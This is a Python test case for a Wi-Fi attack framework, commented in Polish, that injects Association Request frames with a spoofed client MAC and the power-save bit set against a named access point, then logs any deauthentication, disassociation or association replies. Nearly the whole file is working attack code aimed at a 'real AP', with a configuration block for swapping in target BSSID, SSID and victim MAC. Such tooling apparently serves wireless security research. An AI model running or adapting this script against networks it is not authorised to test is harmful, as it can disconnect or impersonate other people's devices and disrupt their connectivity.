# Import dependencies and libraries.
from dependencies.libwifi.wifi import *
from library.testcase import Trigger, Action, Test

class QueueSAQuery(Test):
	""" Injection attack against real AP with spoofed MAC address.
	"""
	name = "test-queue-saquery-attacker"
	kind = Test.Supplicant

	# ===== KONFIGURACJA - ZMIEŃ TE WARTOŚCI =====
	TARGET_AP_BSSID = "06:86:f4:50:c8:18"  # MAC realnego AP (z twoich logów)
	TARGET_AP_SSID = "testnetwork-samsung"  # SSID realnego AP
	SPOOFED_MAC = "a0:51:0b:65:8e:71"  # MAC pod który się podszywasz
	# ============================================
	
	def __init__(self):
		super().__init__([
			# Wyłącz automatyczne skanowanie wpa_supplicant
			Action( trigger=Trigger.NoTrigger, action=Action.Function ),
			# Czekamy chwilę
			Action( trigger=Trigger.NoTrigger, action=Action.Function ),
			# Inject Association-request frames with spoofed MAC
			Action( trigger=Trigger.NoTrigger, action=Action.Inject ),
			Action( trigger=Trigger.NoTrigger, action=Action.Inject ),
			# Listen for response from AP (długo)
			Action( trigger=Trigger.NoTrigger, action=Action.Receive ),
			Action( trigger=Trigger.Received, action=Action.Terminate )
		])
		
	def disable_wpa_scanning(self, station):
		"""Wyłącz automatyczne skanowanie i łączenie wpa_supplicant"""
		try:
			# Usuń wszystkie sieci z wpa_supplicant
			station.wpaspy_command("REMOVE_NETWORK all")
			log(STATUS, "Disabled automatic network scanning", color="yellow")
		except:
			log(WARNING, "Could not disable scanning (continuing anyway)")
		
	def setup_attack(self, station):
		"""Ustawienie parametrów ataku"""
		station.bss = self.TARGET_AP_BSSID
		log(STATUS, "=" * 70, color="cyan")
		log(STATUS, f"TARGET AP BSSID: {self.TARGET_AP_BSSID}", color="cyan")
		log(STATUS, f"TARGET AP SSID: {self.TARGET_AP_SSID}", color="cyan")
		log(STATUS, f"SPOOFED MAC: {self.SPOOFED_MAC}", color="cyan")
		log(STATUS, "=" * 70, color="cyan")
		log(STATUS, "Starting injection attack...", color="red")
		
	def receive(self, station, frame):
		# Filtruj tylko ramki z monwlp0s20f3 (monitor interface)
		if not frame.haslayer(Dot11):
			return False
			
		# Sprawdź czy ramka jest od target AP
		if frame[Dot11].addr2 != self.TARGET_AP_BSSID:
			return False
			
		# Sprawdź czy ramka jest skierowana do spoofed MAC
		if frame[Dot11].addr1 != self.SPOOFED_MAC:
			return False
			
		# Loguj WSZYSTKIE ramki od AP do spoofed MAC
		log(STATUS, "=" * 70, color="orange")
		log(STATUS, f"<<< RECEIVED FROM AP >>>", color="orange")
		log(STATUS, f"Type: {frame.sprintf('%Dot11.type%')}, Subtype: {frame.sprintf('%Dot11.subtype%')}", color="orange")
		log(STATUS, f"Summary: {frame.summary()}", color="orange")
		log(STATUS, "=" * 70, color="orange")
		
		if frame.haslayer(Dot11Deauth):
			log(STATUS, "!!! DEAUTH DETECTED !!!", color="green")
			log(STATUS, f"Reason: {frame[Dot11Deauth].reason}", color="green")
			return True
		elif frame.haslayer(Dot11Disas):
			log(STATUS, "!!! DISASSOC DETECTED !!!", color="green")
			log(STATUS, f"Reason: {frame[Dot11Disas].reason}", color="green")
			return True
		elif frame.haslayer(Dot11AssoResp):
			status = frame[Dot11AssoResp].status
			log(STATUS, f">>> Association Response (status={status}) <<<", color="yellow")
			if status == 0:
				log(STATUS, "AP accepted the association!", color="yellow")
		elif frame.haslayer(Dot11Auth):
			log(STATUS, ">>> Authentication frame <<<", color="yellow")
		elif frame.haslayer(Dot11):
			# SA Query lub inna management frame
			log(STATUS, f">>> Other management frame: {frame.sprintf('%Dot11.subtype%')} <<<", color="yellow")
			
		return False
			
	def generate(self, station):
		
		# Wyłącz automatyczne skanowanie
		self.actions[0].set_function(self.disable_wpa_scanning)
		
		# Setup parametrów ataku
		self.actions[1].set_function(self.setup_attack)
		self.actions[1].set_delay(delay=2)
		
		# Construct payload for the Association-request
		payload = Dot11AssoReq()
		payload /= Dot11Elt( ID='SSID', info=self.TARGET_AP_SSID )
		payload /= Dot11Elt( ID='Rates', info='\x02\x04\x0b\x16\x0c\x12\x18\x24' )
		payload /= Dot11Elt( ID='ESRates', info='\x30\x48\x60\x6c' )
		payload /= Raw(bytes.fromhex("301a0100000fac040100000fac040100000fac08c0000000000fac06")) # RSN
		
		log(STATUS, "Injecting frame 1 with spoofed MAC: " + self.SPOOFED_MAC, color="cyan")
		
		# Pierwsza ramka Association-request z SPOOFED MAC
		frame = Dot11( type="Management" , subtype=0 , addr1=self.TARGET_AP_BSSID , addr2=self.SPOOFED_MAC , addr3=self.TARGET_AP_BSSID )
		frame.FCfield |= Dot11(FCfield="pw-mgt").FCfield # Set to sleep
		self.actions[2].set_frame( frame/payload , mon=True , encrypt=False )
		self.actions[2].set_delay( delay=1 )

		log(STATUS, "Injecting frame 2 with spoofed MAC: " + self.SPOOFED_MAC, color="cyan")

		# Druga ramka Association-request z SPOOFED MAC
		frame = Dot11( type="Management" , subtype=0 , addr1=self.TARGET_AP_BSSID , addr2=self.SPOOFED_MAC , addr3=self.TARGET_AP_BSSID )
		self.actions[3].set_frame( frame/payload , mon=True , encrypt=False )
		self.actions[3].set_delay( delay=2 )
		
		# Nasłuchuj odpowiedzi od AP - DŁUGO
		log(STATUS, "Listening for AP response (20 seconds)...", color="magenta")
		self.actions[4].set_receive( self.receive , mon=True )
		self.actions[4].set_delay( delay=20)  # Czekaj 20 sekund
		
		# Exit
		self.actions[5].set_delay( delay=1 )